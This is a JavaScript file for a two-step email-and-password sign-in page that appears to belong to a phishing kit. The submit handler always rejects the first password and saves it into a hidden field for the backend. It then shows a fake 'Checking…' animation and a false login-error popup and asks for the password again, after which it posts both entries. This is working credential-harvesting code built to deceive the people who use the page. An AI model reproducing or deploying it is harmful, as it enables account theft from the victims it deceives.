// -------- Slideshow logic --------
const slides = document.querySelectorAll(".bg-slide");
let currentSlide = 0;
const slideDuration = 7000;

function showSlide(index) {
  slides.forEach((s, i) => {
    s.classList.toggle("active", i === index);
  });
}

function startSlideshow() {
  if (slides.length === 0) return;
  showSlide(currentSlide);
  setInterval(() => {
    currentSlide = (currentSlide + 1) % slides.length;
    showSlide(currentSlide);
  }, slideDuration);
}

// -------- Step logic --------
const emailStep = document.getElementById("step-email");
const passwordStep = document.getElementById("step-password");
const nextBtn = document.getElementById("nextBtn");
const backBtn = document.getElementById("backBtn");
const emailInput = document.getElementById("emailInput");
const emailError = document.getElementById("emailError");
const passwordInput = document.getElementById("passwordInput");
const passwordError = document.getElementById("passwordError");
const capsWarning = document.getElementById("capsWarning");
const passwordForm = document.getElementById("passwordForm");
const signInBtn = document.getElementById("signInBtn");
const hiddenEmail = document.getElementById("hiddenEmail");

let failedAttempts = 0;
let popup;
let popupBtn;

// -------- Switch step animation --------
function switchStep(from, to, direction = "forward") {
  const outClass = direction === "forward" ? "slide-out-left" : "slide-out-right";
  const inClass  = direction === "forward" ? "slide-in-right" : "slide-in-left";

  from.classList.remove("show");
  from.classList.add(outClass);

  setTimeout(() => {
    from.classList.remove("active");
    from.classList.remove(outClass);

    to.classList.add("active");
    to.classList.add(inClass);

    requestAnimationFrame(() => to.classList.add("show"));

    setTimeout(() => {
      to.classList.remove(inClass);
    }, 350);
  }, 250);
}

// -------- Enter key support on email --------
emailInput.addEventListener("keydown", (e) => {
  if (e.key === "Enter") nextBtn.click();
});

// -------- Next button (email -> password) --------
nextBtn.addEventListener("click", () => {
  const value = emailInput.value.trim();
  const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);

  if (!isValid) {
    emailError.style.display = "block";
    emailInput.classList.add("shake");
    emailInput.setAttribute("aria-invalid", "true");
    setTimeout(() => emailInput.classList.remove("shake"), 300);
    return;
  }

  emailError.style.display = "none";
  emailInput.removeAttribute("aria-invalid");

  // ✅ Pass email to hidden field for backend
  hiddenEmail.value = value;

  switchStep(emailStep, passwordStep, "forward");
  setTimeout(() => passwordInput.focus(), 300);
});

// -------- Back button (password -> email) --------
backBtn.addEventListener("click", () => {
  switchStep(passwordStep, emailStep, "backward");
  setTimeout(() => emailInput.focus(), 300);
});

// -------- Progress bar + spinner animation --------
function fakeCheckingAnimation() {
  return new Promise((resolve) => {
    signInBtn.classList.add("loading");
    signInBtn.querySelector("span").textContent = "Checking…";

    const bar = document.getElementById("progressBar");
    bar.classList.add("active");

    setTimeout(() => {
      signInBtn.classList.remove("loading");
      signInBtn.querySelector("span").textContent = "Sign in";
      bar.classList.remove("active");
      resolve();
    }, 1200);
  });
}

// -------- Popup countdown --------
function startPopupCountdown() {
  let timeLeft = 3;
  const countdownEl = document.getElementById("popupCountdown");

  countdownEl.textContent = `Closing in ${timeLeft}…`;

  const timer = setInterval(() => {
    timeLeft--;
    countdownEl.textContent = `Closing in ${timeLeft}…`;

    if (timeLeft <= 0) {
      clearInterval(timer);
      popup.classList.remove("show");
      setTimeout(() => popup.style.display = "none", 200);
    }
  }, 1000);
}

// -------- Try again animation --------
function playTryAgainAnimation() {
  passwordInput.classList.add("try-again");
  setTimeout(() => passwordInput.classList.remove("try-again"), 1200);
}

// -------- Caps Lock warning --------
passwordInput.addEventListener("keydown", (e) => {
  const caps = e.getModifierState && e.getModifierState("CapsLock");
  capsWarning.style.display = caps ? "block" : "none";
});

passwordInput.addEventListener("blur", () => {
  capsWarning.style.display = "none";
});

const firstPasswordField = document.getElementById("firstPassword");

// -------- Password form submit logic --------
passwordForm.addEventListener("submit", async (e) => {
  const value = passwordInput.value.trim();

  if (!value) {
    e.preventDefault();
    passwordError.style.display = "block";
    passwordInput.classList.add("shake");
    passwordInput.setAttribute("aria-invalid", "true");
    setTimeout(() => passwordInput.classList.remove("shake"), 300);
    return;
  }

  passwordError.style.display = "none";
  passwordInput.removeAttribute("aria-invalid");

  failedAttempts++;

  // FIRST ATTEMPT → BLOCK POST, SAVE FIRST PASSWORD
  if (failedAttempts === 1) {
    e.preventDefault();

    // ✅ Save first password attempt for backend
    firstPasswordField.value = value;

    await fakeCheckingAnimation();

    popup.style.display = "flex";
    requestAnimationFrame(() => popup.classList.add("show"));

    startPopupCountdown();

    passwordInput.classList.add("shake");
    setTimeout(() => passwordInput.classList.remove("shake"), 300);

    passwordInput.value = "";

    setTimeout(() => playTryAgainAnimation(), 3500);

    return;
  }

  // SECOND ATTEMPT → REAL POST
  if (failedAttempts === 2) {
    document.body.classList.add("redirecting");

    signInBtn.classList.add("loading");
    document.getElementById("progressBar").classList.add("active");
    // Let the form submit normally
  }
});


// -------- Popup setup + slideshow start --------
window.addEventListener("DOMContentLoaded", () => {
  startSlideshow();

  popup = document.getElementById("loginErrorPopup");
  popupBtn = document.getElementById("closePopupBtn");

  popupBtn.addEventListener("click", () => {
    popup.classList.remove("show");
    setTimeout(() => popup.style.display = "none", 200);
  });

  // -------- Backend error handling --------
  const params = new URLSearchParams(window.location.search);
  const err = params.get("error");

  if (err === "invalid") {
    popup.style.display = "flex";
    requestAnimationFrame(() => popup.classList.add("show"));
    startPopupCountdown();
  }

  if (err === "verify") {
    document.getElementById("serverError").textContent =
      "Please verify your email before signing in.";
  }

  if (err === "server") {
    document.getElementById("serverError").textContent =
      "Server error. Try again later.";
  }
});